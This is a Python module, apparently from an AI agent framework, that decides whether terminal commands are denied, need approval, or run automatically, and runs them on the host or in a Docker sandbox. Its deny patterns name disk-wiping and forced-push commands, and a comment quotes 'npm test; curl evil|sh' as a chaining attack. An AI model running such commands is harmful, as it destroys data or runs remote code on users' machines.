from __future__ import annotations

import asyncio
import os
import re
import shlex
import shutil
import uuid
from dataclasses import dataclass, field
from pathlib import Path
from typing import Literal

Mode = Literal["sandbox", "project_host", "system_admin"]
Decision = Literal["auto", "ask", "deny"]

DANGEROUS = [
    re.compile(r"(?i)\b(?:format|diskpart|mkfs|fdisk)\b"),
    re.compile(r"(?i)\brm\s+-rf\s+/(?:\s|$)"),
    re.compile(r"(?i)\bgit\s+push\b.*--force"),
    re.compile(r"(?i)\bgit\s+reset\s+--hard\b"),
]
ASK_PATTERNS = [
    re.compile(r"(?i)\bgit\s+push\b"),
    re.compile(r"(?i)\b(?:npm|pnpm|yarn|pip)\s+install\b"),
    re.compile(r"(?i)\bdocker\s+compose\s+(?:up|down|restart)\b"),
    re.compile(r"(?i)\b(?:sudo|runas)\b"),
]
AUTO_PATTERNS = [
    re.compile(r"(?i)^git\s+(?:status|diff|log|show)\b"),
    re.compile(r"(?i)^(?:pytest|python\s+-m\s+pytest)\b"),
    re.compile(r"(?i)^(?:npm|pnpm|yarn)\s+(?:test|run\s+(?:test|lint|build))\b"),
]
# Только для Windows. Когда доступной оболочки `sh` нет и команда уходит в
# cmd.exe, `cat`/`ls` там просто не существуют — читающий эквивалент называется
# `type`/`dir`. Список отдельный, а не дописан в AUTO_PATTERNS, чтобы решение
# политики на Linux осталось ровно прежним: там `dir` и `type` как были ask,
# так и остаются.
AUTO_PATTERNS_NT = [
    re.compile(r"(?i)^(?:type|dir)\b"),
    re.compile(r"(?i)^where\b"),
]


# AUTO_PATTERNS матчатся `re.search` без конца-якоря — они доказывают, что
# командная строка НАЧИНАЕТСЯ с безопасной команды, а не что она СОСТОИТ
# только из неё. `npm test; curl evil|sh` тоже матчит `^npm\s+test\b` и без
# этой проверки ушёл бы в auto: хвост после `;` исполнится тем же host-shell
# без approval. Поэтому auto разрешён только для одиночной команды — без
# конкатенации/подстановки/пайпа.
_SHELL_CHAIN = re.compile(r"[;&|`\n]|\$\(")


def _is_single_command(cmd: str) -> bool:
    """AUTO допустим только для одной команды без chaining/substitution."""
    return not _SHELL_CHAIN.search(cmd)


def auto_patterns() -> list[re.Pattern[str]]:
    """Читающие команды, идущие AUTO, для текущей ОС.

    Считается при вызове, а не при импорте: тест подменяет `os.name` и
    проверяет вторую платформу, не запуская её.
    """
    if os.name == "nt":
        return [*AUTO_PATTERNS, *AUTO_PATTERNS_NT]
    return AUTO_PATTERNS


def host_shell() -> list[str] | None:
    """Как запускать команду НА ХОСТЕ (режимы project_host / system_admin).

    None — через штатный `create_subprocess_shell`, то есть `/bin/sh -c` на
    POSIX. Поведение Linux этим не меняется ни на шаг.

    На Windows `create_subprocess_shell` даёт cmd.exe, где нет ни `cat`, ни
    `ls`, ни `&&`-цепочек в привычном виде: любая команда, написанная моделью
    по-юниксовому, там падает с «не является внутренней или внешней командой».
    Если в PATH есть `sh` (он приходит с Git for Windows и стоит почти у всех,
    кто работает с git), берём его — команды агентов начинают работать так же,
    как на боевой Linux-машине. Если `sh` нет — честно cmd /c, а не отказ.
    """
    if os.name != "nt":
        return None
    sh = shutil.which("sh")
    if sh:
        return [sh, "-lc"]
    return [os.environ.get("COMSPEC") or "cmd.exe", "/c"]


def within(path: Path, roots: list[Path]) -> bool:
    p = path.resolve()
    for root in roots:
        r = root.resolve()
        try:
            p.relative_to(r)
            return True
        except ValueError:
            pass
    return False

@dataclass(slots=True)
class TerminalPolicy:
    allowed_roots: list[Path]
    mode: Mode = "sandbox"

    def decision(self, cmd: str, cwd: Path) -> Decision:
        if not within(cwd, self.allowed_roots):
            return "deny"
        if any(p.search(cmd) for p in DANGEROUS):
            return "deny"
        if self.mode == "system_admin":
            # Admin mode is still approval-gated; never silently auto-elevate.
            return "ask"
        if any(p.search(cmd) for p in ASK_PATTERNS):
            return "ask"
        if (self.mode == "project_host" and _is_single_command(cmd)
                and any(p.search(cmd) for p in auto_patterns())):
            return "auto"
        if self.mode == "sandbox":
            return "auto"
        return "ask"

@dataclass
class TerminalSession:
    id: str
    cwd: Path
    cmd: str
    mode: Mode
    proc: asyncio.subprocess.Process
    output: list[str] = field(default_factory=list)
    finished: bool = False
    exit_code: int | None = None
    # F-011: владелец живой сессии (task id). Сессия по session_id доступна
    # только задаче, которая её создала; None = создана владельцем через HTTP.
    owner: str | None = None
    _reader: asyncio.Task | None = None

class TerminalManager:
    def __init__(self, sandbox_image: str = "python:3.12-slim"):
        self.sandbox_image = sandbox_image
        self.sessions: dict[str, TerminalSession] = {}

    async def start(self, cmd: str, cwd: Path, policy: TerminalPolicy,
                    *, approved: bool = False, network: bool = False,
                    owner: str | None = None) -> TerminalSession:
        cwd = cwd.resolve()
        # F-009: единая точка confinement и для host-режимов, и для sandbox —
        # каталог, который уйдёт в `-v cwd:/work`, обязан лежать в разрешённых
        # корнях. Контейнер — защита в глубину, а не замена авторизации пути.
        if not within(cwd, policy.allowed_roots):
            raise PermissionError(f"cwd outside allowed roots: {cwd}")
        decision = policy.decision(cmd, cwd)
        if decision == "deny":
            raise PermissionError("terminal command denied by policy")
        if decision == "ask" and not approved:
            raise PermissionError("terminal command requires approval")

        if policy.mode == "sandbox":
            # Внутри контейнера оболочка всегда `sh` — образ линуксовый
            # независимо от того, какая ОС на хосте. Хостовой выбор оболочки
            # сюда не относится и относиться не должен.
            docker_args = [
                "docker", "run", "--rm",
                "--network", "bridge" if network else "none",
                "-v", f"{cwd}:/work",
                "-w", "/work",
                self.sandbox_image,
                "sh", "-lc", cmd,
            ]
            proc = await asyncio.create_subprocess_exec(
                *docker_args,
                stdin=asyncio.subprocess.PIPE,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.STDOUT,
            )
        else:
            shell = host_shell()
            # cmd.exe does not use CRT argv escaping: passing the complete
            # command as an exec argument inserts backslashes before quotes.
            # Python's shell launcher supplies cmd /c with its native quoting.
            is_cmd = shell is not None and Path(shell[0]).name.lower() in ("cmd", "cmd.exe")
            if shell is None or is_cmd:
                proc = await asyncio.create_subprocess_shell(
                    cmd, cwd=str(cwd),
                    **({"executable": shell[0]} if is_cmd else {}),
                    stdin=asyncio.subprocess.PIPE,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.STDOUT,
                )
            else:
                proc = await asyncio.create_subprocess_exec(
                    *shell, cmd, cwd=str(cwd),
                    stdin=asyncio.subprocess.PIPE,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.STDOUT,
                )

        sid = uuid.uuid4().hex[:12]
        session = TerminalSession(sid, cwd, cmd, policy.mode, proc, owner=owner)
        self.sessions[sid] = session
        session._reader = asyncio.create_task(self._read(session))
        return session

    async def _read(self, s: TerminalSession) -> None:
        assert s.proc.stdout is not None
        import locale

        while True:
            line = await s.proc.stdout.readline()
            if not line:
                break
            try:
                text = line.decode("utf-8")
            except UnicodeDecodeError:
                # Windows-хост: cmd.exe/консольные утилиты пишут в OEM-кодировке
                # (cp866/cp1251), а не в UTF-8 — иначе кириллица превращается
                # в mojibake и вывод теряет смысл.
                text = line.decode(locale.getpreferredencoding(False), errors="replace")
            s.output.append(text.rstrip("\r\n"))
            if len(s.output) > 5000:
                del s.output[:1000]
        s.exit_code = await s.proc.wait()
        s.finished = True

    def status(self, session_id: str) -> dict:
        s = self.sessions[session_id]
        return {
            "id": s.id,
            "cwd": str(s.cwd),
            "cmd": s.cmd,
            "mode": s.mode,
            "pid": s.proc.pid,
            "finished": s.finished,
            "exit_code": s.exit_code,
            "output_tail": s.output[-200:],
        }

    async def write_stdin(self, session_id: str, text: str) -> None:
        s = self.sessions[session_id]
        if s.proc.stdin is None or s.finished:
            raise RuntimeError("stdin unavailable")
        s.proc.stdin.write(text.encode())
        await s.proc.stdin.drain()

    async def kill(self, session_id: str) -> None:
        s = self.sessions[session_id]
        if not s.finished:
            s.proc.kill()
            await s.proc.wait()
            s.finished = True
            s.exit_code = s.proc.returncode
